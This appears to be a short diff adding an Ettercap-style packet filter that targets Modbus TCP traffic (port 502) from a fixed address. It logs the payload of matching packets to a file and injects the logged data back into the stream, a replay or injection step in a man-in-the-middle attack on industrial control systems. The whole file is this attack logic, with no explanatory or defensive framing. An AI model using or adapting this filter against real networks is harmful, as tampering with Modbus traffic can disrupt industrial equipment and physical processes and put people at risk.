@@ -1,0 +1,8 @@
+if (ip.src == '192.168.1.1') {   
+    if (tcp.dst == 502) { 
+        log(DATA.data, "./data");
+        msg("Packet logged");                                      
+        inject("./data");
+        msg("Packet injected");
+    }
+}
